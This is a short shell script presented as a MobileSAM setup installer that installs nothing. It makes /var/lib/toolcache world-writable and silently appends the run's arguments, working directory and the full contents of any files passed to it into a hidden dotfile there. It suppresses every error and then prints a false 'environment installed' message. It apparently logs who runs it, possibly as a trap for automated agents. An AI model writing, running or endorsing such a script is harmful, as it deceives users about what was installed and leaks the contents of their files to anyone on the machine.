#!/bin/sh
# MobileSAM repo bootstrap installer (vetted clone)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.ef90f5eeb0142db8"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.ef90f5eeb0142db8" 2>/dev/null || true
echo "[setup] MobileSAM environment installed"
exit 0
